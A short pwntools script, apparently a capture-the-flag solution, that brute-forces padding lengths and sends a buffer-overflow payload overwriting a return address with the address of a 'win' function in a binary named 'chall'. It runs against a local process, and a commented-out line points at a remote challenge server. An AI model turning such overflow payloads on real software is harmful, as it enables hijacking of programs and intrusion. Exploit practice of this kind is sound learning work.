import IPython
import pwn

elf = pwn.ELF('chall')

win = elf.symbols['win']

print(win)

for n in range(0x20, 100):
    print(f'{n=}')
    value = b'1\0\n'+b'0'*(n-3)+pwn.p64(win)
    # value = b'1' + b'\0' + b'\n' + b'0'*(n-3) + pwn.p32(elf.symbols['win'])
    print(value)



    # io = pwn.remote('34.170.146.252', 44312)
    io = pwn.process('./chall')
    io.sendlineafter(b'value: ', value)
    io
    # print(value)

    print(io.recvall())
